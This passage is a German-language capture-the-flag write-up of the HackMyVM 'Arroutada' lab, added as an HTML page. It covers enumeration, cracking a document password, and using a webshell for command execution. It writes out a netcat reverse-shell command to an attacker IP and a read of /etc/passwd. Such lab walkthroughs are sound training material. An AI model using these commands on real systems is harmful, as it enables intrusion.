@@ -1,0 +1,980 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arroutada - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+
+    <!-- HINWEIS: Die Hintergrundfarbe für den Header wird durch CSS gesteuert (.header-bg) -->
+    <div class="header-bg">
+        <h1>Arroutada - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- HINWEIS: Die Farbe für 'Easy' (Lime/Grün) wird durch CSS gesteuert (h2 in .level-container) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                 <!-- HINWEIS: Die Hintergrundfarbe der Segmente (Lime/Grün) wird durch CSS gesteuert (.segment-*) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- HINWEIS: Die Hintergrundfarbe des inneren Kreises wird durch CSS gesteuert (.inner, passend zum Header) -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">libreoffice2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">pty</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">Metasploit (msf6)</div>
+                <div class="tool-item">meterpreter</div>
+                <div class="tool-item">script</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">xargs</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">tr</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc-internal-service">Proof of Concept (Internal Service Exploitation)</a></li>
+                <li><a href="#poc-root">Proof of Concept (Privilege Escalation zu Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist die Identifizierung der Ziel-IP im lokalen Netzwerk mithilfe von `arp-scan -l`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet die IP `192.168.2.124` mit der MAC `08:00:27:66:8d:f7`, die auf eine VirtualBox-VM hinweist. Das Ziel ist identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `192.168.2.124` für den Nmap-Scan.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und -überwachung zur Erkennung von Scans.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.124	08:00:27:66:8d:f7	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird durchgeführt, um offene Ports und Dienste auf dem Ziel zu finden.
+            *   `-sS`: SYN Scan.
+            *   `-sC`: Standard-Skripte.
+            *   `-sV`: Versionserkennung.
+            *   `-T5`: Schnelles Timing.
+            *   `-AO`: OS-Erkennung (Teil von `-A`).
+            *   `-p-`: Scan aller Ports.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Überraschenderweise ist nur **Port 80 (HTTP)** offen, der einen `Apache httpd 2.4.54` auf Debian mit der Standardseite betreibt. Das Fehlen anderer Ports wie SSH oder FTP schränkt die Angriffsfläche stark auf den Webserver ein. OS-Erkennung deutet auf Linux.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die gesamte Aufmerksamkeit auf die Enumeration des Webservers auf Port 80. Suchen Sie nach versteckten Verzeichnissen, Dateien, Subdomains und Webanwendungs-Schwachstellen.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, ob das Fehlen anderer Dienste (wie SSH für die Verwaltung) beabsichtigt ist. Härten Sie den Apache-Server (keine Default-Seite, Sicherheitsheader).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO 192.168.2.124 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 15:55 CEST
+Nmap scan report for arroutada (192.168.2.124)
+Host is up (0.00013s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:66:8D:F7 (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 4.15 - 5.6 (99%), Linux 5.0 - 5.3 (98%), Linux 5.4 (97%), Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.0 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms arroutada (192.168.2.124)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ein Bild (`apreton.png`), das wahrscheinlich auf der Webseite gefunden wurde (impliziert, da der Pfad `/imgs/` bekannt ist), wird mit `wget` heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Download ist erfolgreich. Bilder können manchmal Metadaten oder versteckte Informationen enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die heruntergeladene Bilddatei mit Tools wie `exiftool`, `strings` oder Steganographie-Werkzeugen.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Metadaten aus Bildern, bevor sie auf einem Webserver veröffentlicht werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.124/imgs/apreton.png</span></div>
+                    <pre>
+--2023-04-08 15:59:31--  http://192.168.2.124/imgs/apreton.png
+Verbindungsaufbau zu 192.168.2.124:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 70806 (69K) [image/png]
+Wird in »apreton.png« gespeichert.
+
+apreton.png                   100%[===============================================>]  69,15K  --.-KB/s    in 0s
+
+2023-04-08 15:59:31 (877 MB/s) - »apreton.png« gespeichert [70806/70806]</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `exiftool` wird verwendet, um die Metadaten der heruntergeladenen Bilddatei `apreton.png` anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die meisten Metadaten sind Standardinformationen (Größe, Typ etc.). Der entscheidende Fund ist jedoch das **Title**-Feld: `{"path": "/scout"}`. Dies ist ein starker Hinweis auf ein verstecktes Verzeichnis oder einen Pfad namens `/scout` auf dem Webserver.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die URL `http://192.168.2.124/scout/` im Browser aufzurufen oder mit `curl` zu untersuchen.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Informationen aus Metadaten von Dateien, die öffentlich zugänglich sind. Vermeiden Sie es, Pfade oder andere interne Details in Metadaten zu speichern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">exiftool apreton.png</span></div>
+                    <pre>
+ExifTool Version Number         : 12.49
+File Name                       : apreton.png
+Directory                       : .
+File Size                       : 71 kB
+File Modification Date/Time     : 2023:01:08 15:43:02+01:00
+File Access Date/Time           : 2023:04:08 15:59:31+02:00
+File Inode Change Date/Time     : 2023:04:08 15:59:31+02:00
+File Permissions                : -rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 1280
+Image Height                    : 661
+Bit Depth                       : 8
+Color Type                      : Grayscale with Alpha
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Title                           : {"path": "/scout"}
+Image Size                      : 1280x661
+Megapixels                      : 0.846</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der in den Metadaten gefundene Pfad `/scout` wird aufgerufen. Dort findet sich eine Nachricht von "J1" an "Telly".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Nachricht ist ein weiterer wichtiger Hinweis. Sie erwähnt einen Pfad `/scout/******/docs/`, wobei der mittlere Teil (`******`) unbekannt ist. Sie erwähnt auch "J1", was auf einen Benutzernamen oder ein Verzeichnis hindeuten könnte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie Gobuster oder ein ähnliches Tool, um Verzeichnisse innerhalb von `/scout/` zu finden, um den fehlenden Teil des Pfades (`******`) zu identifizieren. Achten Sie auf Verzeichnisse, die auf Benutzer hindeuten könnten (z.B. `j1`).
+            <br><strong>Empfehlung (Admin):</strong> Hinterlassen Sie keine internen Notizen oder Hinweise auf Pfadstrukturen in öffentlich zugänglichen Bereichen des Webservers.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt im Originaltext, Inhalt der Webseite -->
+                    <pre>
+http://192.168.2.124/scout/
+
+Hi, Telly,
+
+I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
+/scout/******/docs/
+
+With continued gratitude,
+J1.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien unterhalb von `http://192.168.2.124/` zu finden, wobei der Fokus auf dem zuvor entdeckten `/scout`-Pfad liegt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet viele Unterverzeichnisse unter `/scout/`, darunter `/scout/j1/` und `/scout/j2/`. Entscheidend ist der Fund von `/scout/j2/docs/` und darin die Datei `pass.txt`. Dies passt perfekt zu dem Hinweis aus der Nachricht (`/scout/******/docs/`). Die vielen `z*`-Dateien sind wahrscheinlich irrelevant.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie den Inhalt des Verzeichnisses `/scout/j2/docs/` herunter, insbesondere die Datei `pass.txt`. Die anderen gefundenen Dateien (`z*`) könnten passwortgeschützte Archive sein, wie sich später herausstellt (impliziert durch `libreoffice2john shellfile.ods`). Der Befehl `wget -r ...` im nächsten Schritt tut genau das.
+            <br><strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf Verzeichnisse, die sensible Dokumente oder Passwortdateien enthalten. Verwenden Sie keine leicht zu erratenden Verzeichnisstrukturen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.124 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+===============================================================
+
+http://192.168.2.124/index.html                         [Size: 59]
+http://192.168.2.124/imgs                               [Size: 313] [--> http://192.168.2.124/imgs/]
+http://192.168.2.124/scout                              [Size: 314] [--> http://192.168.2.124/scout/]
+
+http://192.168.2.124/scout/download                     [Size: 323] [--> http://192.168.2.124/scout/download/]
+http://192.168.2.124/scout/img                          [Size: 318] [--> http://192.168.2.124/scout/img/]
+http://192.168.2.124/scout/1                            [Size: 316] [--> http://192.168.2.124/scout/1/]
+http://192.168.2.124/scout/links                        [Size: 320] [--> http://192.168.2.124/scout/links/]
+http://192.168.2.124/scout/content                      [Size: 322] [--> http://192.168.2.124/scout/content/]
+http://192.168.2.124/scout/html                         [Size: 319] [--> http://192.168.2.124/scout/html/]
+http://192.168.2.124/scout/data                         [Size: 319] [--> http://192.168.2.124/scout/data/]
+http://192.168.2.124/scout/java                         [Size: 319] [--> http://192.168.2.124/scout/java/]
+http://192.168.2.124/scout/exploits                     [Size: 323] [--> http://192.168.2.124/scout/exploits/]
+http://192.168.2.124/scout/scan                         [Size: 319] [--> http://192.168.2.124/scout/scan/]
+http://192.168.2.124/scout/j1                           [Size: 317] [--> http://192.168.2.124/scout/j1/]
+http://192.168.2.124/scout/j2                           [Size: 317] [--> http://192.168.2.124/scout/j2/]
+http://192.168.2.124/scout/j2/docs/z1                   [Size: 0]
+http://192.168.2.124/scout/j2/docs/pass.txt             [Size: 14]
+http://192.168.2.124/scout/j2/docs/z5                   [Size: 0]
+http://192.168.2.124/scout/j2/docs/z3                   [Size: 0]
+http://192.168.2.124/scout/j2/docs/z2                   [Size: 0]
+http://192.168.2.124/scout/j2/docs/z6                   [Size: 0]
+http://192.168.2.124/scout/j2/docs/z4                   [Size: 0]
+http://192.168.2.124/scout/j2/docs/z7                   [Size: 0]
+http://192.168.2.124/scout/j2/docs/z8                   [Size: 0]
+http://192.168.2.124/scout/j2/docs/z10                  [Size: 0]
+http://192.168.2.124/scout/j2/docs/z9                   [Size: 0]
+http://192.168.2.124/scout/j2/docs/z12                  [Size: 0]
+http://192.168.2.124/scout/j2/docs/z11                  [Size: 0]</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wget` wird mit mehreren Optionen verwendet, um den Inhalt des Verzeichnisses `/scout/j2/docs/` rekursiv herunterzuladen.
+            *   `-r`: Rekursiv.
+            *   `-np`: Nicht in übergeordnete Verzeichnisse wechseln (`no-parent`).
+            *   `-nH`: Keine Host-Präfix-Verzeichnisse erstellen (`no-host-directories`).
+            *   `--cut-dirs=2`: Entfernt die ersten 2 Verzeichnisebenen (`/scout/j2/`) aus dem lokalen Pfad.
+            *   `-R 'index.html*'`: Weist `wget` an, `index.html`-Dateien abzulehnen (zu entfernen), die oft automatisch von Apache generiert werden, wenn Directory Indexing aktiv ist.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl lädt erfolgreich alle relevanten Dateien aus `/scout/j2/docs/` herunter, einschließlich `pass.txt` und wahrscheinlich einer passwortgeschützten Datei (wie `shellfile.ods`, die im nächsten Schritt erwähnt wird).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die heruntergeladenen Dateien, insbesondere `pass.txt` und verdächtige Office-Dokumente oder Archive.
+            <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Indexing auf dem Webserver, um das einfache Auflisten und Herunterladen von Verzeichnisinhalten zu verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget -r -np -nH --cut-dirs=2 -R 'index.html*' http://192.168.2.124/scout/j2/docs/</span></div>
+                    <pre>
+--2023-04-08 16:18:02--  http://192.168.2.124/scout/j2/docs/
+Verbindungsaufbau zu 192.168.2.124:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: nicht spezifiziert [text/html]
+Wird in »docs/index.html.tmp« gespeichert.
+
+docs/index.html.tmp               [ <=>                                            ] 185,32K  --.-KB/s    in 0,001s
+
+2023-04-08 16:18:02 (304 MB/s) - »docs/index.html.tmp« gespeichert [189767]
+
+»robots.txt« wird geladen; bitte Fehler ignorieren.
+
+--2023-04-08 16:18:02--  http://192.168.2.124/robots.txt
+Wiederverwendung der bestehenden Verbindung zu 192.168.2.124:80.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 404 Not Found
+2023-04-08 16:18:02 FEHLER 404: Not Found.
+
+»docs/index.html.tmp« wird entfernt, da dies zurückgewiesen werden soll.
+
+--2023-04-08 16:18:02--  http://192.168.2.124/scout/j2/docs/?C=N;O=D
+Wiederverwendung der bestehenden Verbindung zu 192.168.2.124:80.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+[... weitere Dateien heruntergeladen ...]</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine heruntergeladene LibreOffice Calc-Datei (`shellfile.ods`) wird mit `libreoffice2john` verarbeitet, um den Passwort-Hash zu extrahieren. Dieser Hash wird dann mit `john` und der `rockyou.txt`-Wortliste geknackt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Prozess ist erfolgreich. Das Passwort für die `.ods`-Datei wird als `<span class="password">john11</span>` ermittelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Öffnen Sie die Datei `shellfile.ods` mit dem Passwort `john11` und untersuchen Sie ihren Inhalt. Suchen Sie nach weiteren Hinweisen, Zugangsdaten oder Skripten. Prüfen Sie auch den Inhalt der `pass.txt`-Datei.
+            <br><strong>Empfehlung (Admin):</strong> Speichern Sie keine sensiblen Informationen in passwortgeschützten Office-Dokumenten in öffentlich zugänglichen Bereichen. Verwenden Sie starke, einzigartige Passwörter für Dokumente, falls Schutz erforderlich ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/docs]
+└─# <span class="command">libreoffice2john shellfile.ods > hash</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/docs]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 256/256 AVX2 8x BF/AES])
+Cost 1 (iteration count) is 100000 for all loaded hashes
+Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">john11</span>           (shellfile.ods)
+1g 0:00:00:11 DONE (2023-04-08 16:29) 0.08984g/s 1492p/s 1492c/s 1492C/s marvie..143jesus
+Use the "--show --format=ODF" options to display all of the cracked passwords reliably
+Session completed.</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird erneut ausgeführt, diesmal möglicherweise nach der Entdeckung weiterer Verzeichnisse, um spezifische Schwachstellen zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto liefert im Grunde dieselben Ergebnisse wie zuvor: fehlende Sicherheitsheader und Directory Indexing im `/imgs/`-Verzeichnis. Es deckt keine neuen kritischen Schwachstellen auf, die für den nächsten Schritt relevant wären.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Nikto-Ergebnisse sind hier weniger relevant als die Funde aus der `shellfile.ods` (implizit) und `pass.txt`. Konzentrieren Sie sich auf die daraus gewonnenen Informationen.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie die bereits genannten Härtungsmaßnahmen (Header, Directory Indexing).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.124 -C all</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.124
++ Target Hostname:    192.168.2.124
++ Target Port:        80
++ Start Time:         2023-04-08 15:57:06 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.54 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
++ OSVDB-3268: /imgs/: Directory indexing found.
++ OSVDB-3092: /imgs/: This might be interesting...
++ 26522 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2023-04-08 16:01:02 (GMT2) (236 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis"><strong>Analyse:</strong> Hier wird ein Pfad `/thejabasshell.php` und eine URL mit Parametern (`?a=ls&b=john11`) gezeigt. Dieser Pfad wurde wahrscheinlich innerhalb der passwortgeschützten `shellfile.ods` gefunden. Die URL deutet auf eine Webshell hin, die zwei Parameter erwartet: `a` für den auszuführenden Befehl und `b` für ein Passwort/Authentifizierungstoken. Der Wert `john11` für Parameter `b` wurde zuvor als Passwort für die ODS-Datei geknackt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Entdeckung dieser Webshell ist der Schlüssel zum Initial Access. Sie ermöglicht Remote Code Execution (RCE) auf dem Server, wenn das korrekte Passwort (`john11`) im Parameter `b` übergeben wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese Webshell, um Befehle auf dem Server auszuführen. Führen Sie zunächst einfache Befehle wie `id` oder `whoami` aus, um den Benutzerkontext zu bestätigen. Nutzen Sie die Shell dann, um eine Reverse Shell zu erhalten.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Webshell (`thejabasshell.php`) vom Server. Untersuchen Sie, wie sie dorthin gelangt ist (wahrscheinlich über die ODS-Datei). Sichern Sie sensible Dateien besser.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt im Originaltext, Pfad und Beispiel-URL -->
+                    <pre>
+/thejabasshell.php
+http://192.168.2.124//thejabasshell.php?a=ls&b=<span class="password">john11</span></pre>
+                    <!-- Beispiel für Reverse Shell Versuch -->
+                    <pre>http://192.168.2.124//thejabasshell.php?a=nc%20-e%20/bin/bash%20192.168.2.114%209001&b=<span class="password">john11</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um die Parameter der Webshell `thejabasshell.php` zu fuzzen und zu bestätigen.
+             *   Erster Versuch: `?FUZZ=../../../etc/passwd`. Testet, ob der Parametername selbst eine LFI ermöglicht (wie im vorherigen Bericht). Das Ergebnis `a` (Payload "a") deutet darauf hin, dass `a` der korrekte Parametername ist. Die Fehlermeldung `Error: Problem with parameter "b"` bestätigt, dass Parameter `b` ebenfalls benötigt wird.
+             *   Zweiter Versuch: `?a=id&b=FUZZ`. Testet verschiedene Werte für den Parameter `b` (Passwort). Findet `pass` (Payload "pass") als funktionierenden Wert, was zu einer Antwort mit 54 Zeichen führt. *Anmerkung: Dies widerspricht dem zuvor geknackten Passwort `john11`. Möglicherweise gibt es mehrere gültige Passwörter, oder `pass` ist ein hartkodiertes Master-Passwort in der Shell, oder das geknackte `john11` war für etwas anderes gedacht, obwohl es hier funktioniert zu haben scheint.* Im Folgenden wird `pass` verwendet.
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Fuzzing-Versuche bestätigen, dass die Webshell die Parameter `a` (Befehl) und `b` (Passwort/Token) erwartet. Der Wert `pass` scheint für `b` zu funktionieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die URL-Struktur `http://192.168.2.124/thejabasshell.php?a=[BEFEHL]&b=pass`, um Befehle auszuführen.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Webshell. Implementieren Sie Web Application Firewalls (WAF), um Anfragen an bekannte Shell-Pfade oder mit typischen RCE-Mustern zu blockieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.2.124/thejabasshell.php?FUZZ=../../../etc/passwd --hw 0</span></div>
+                    <pre>
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000199:   200        0 L      5 W        33 Ch       "a"
+
+=====================================================================</pre>
+                    <!-- Implizite Ausgabe der Shell auf dem Server -->
+                    <pre>http://192.168.2.124/thejabasshell.php?a=../../../etc/passwd
+
+Error: Problem with parameter "b"</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.124/thejabasshell.php?a=id&b=FUZZ" --hw 5</span></div>
+                     <pre>
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000006169:   200        1 L      3 W        54 Ch       "<span class="password">pass</span>"
+</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Webshell wird nun mit dem funktionierenden Parameter `b=pass` verwendet, um Befehle auszuführen und den Benutzerkontext zu überprüfen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong>
+             *   `?a=id&b=pass`: Gibt `uid=33(www-data) ...` zurück. Die Befehlsausführung funktioniert als Benutzer `www-data`.
+             *   `?a=whoami&b=pass`: Bestätigt `www-data`.
+             *   `?a=%20cat%20/etc/passwd%20|%20grep%20bash&b=pass`: Führt `cat /etc/passwd | grep bash` (URL-kodiert) aus und findet die Benutzer `root` und `drito` (UID 1001).
+             Die Webshell bietet zuverlässige RCE als `www-data`.
+             </p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Webshell, um eine Reverse Shell zu Ihrem Listener zu initiieren.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Webshell.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, URL und Ausgabe -->
+                     <pre>
+http://192.168.2.124/thejabasshell.php?a=id&b=pass
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, URL und Ausgabe -->
+                     <pre>
+http://192.168.2.124/thejabasshell.php?a=whoami&b=pass
+
+www-data</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, URL und Ausgabe -->
+                     <pre>
+http://192.168.2.124/thejabasshell.php?a=%20cat%20/etc/passwd%20|%20grep%20bash&b=pass
+
+root:x:0:0:root:/root:/bin/bash
+drito:x:1001:1001::/home/drito:/bin/bash</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Webshell wird verwendet, um einen Netcat-Reverse-Shell-Befehl auszuführen (`nc -e /bin/bash 192.168.2.114 9001`, URL-kodiert). Gleichzeitig wird auf der Angreifer-Maschine (`192.168.2.114`) ein Listener auf Port `9001` gestartet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Verbindung kommt erfolgreich zustande. Der Angreifer hat nun eine interaktive Shell als `www-data` auf dem Zielsystem.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell für bessere Funktionalität.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Webshell. Überwachen Sie ausgehende Netzwerkverbindungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, URL -->
+                     <pre>http://192.168.2.124/thejabasshell.php?a=%20nc%20-e%20/bin/bash%20192.168.2.114%209001&b=pass</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.114] from (UNKNOWN) [192.168.2.124] 42024</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach Erhalt der Reverse Shell als `www-data` wird die Netzwerkkonfiguration mit `ss -tulpe` und `ss -lntp` untersucht, um lauschende Dienste zu identifizieren, insbesondere solche, die nur lokal erreichbar sind.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `ss`-Ausgaben zeigen:
+            *   Port 25 (SMTP): Lauscht auf `127.0.0.1` und `::1` (lokal), wird von Exim4 verwendet.
+            *   **Port 8000:** Lauscht auf `127.0.0.1` (lokal). Der Prozess gehört `uid:1001`, was dem zuvor gefundenen Benutzer `drito` entspricht. Dies ist ein sehr interessanter interner Dienst.
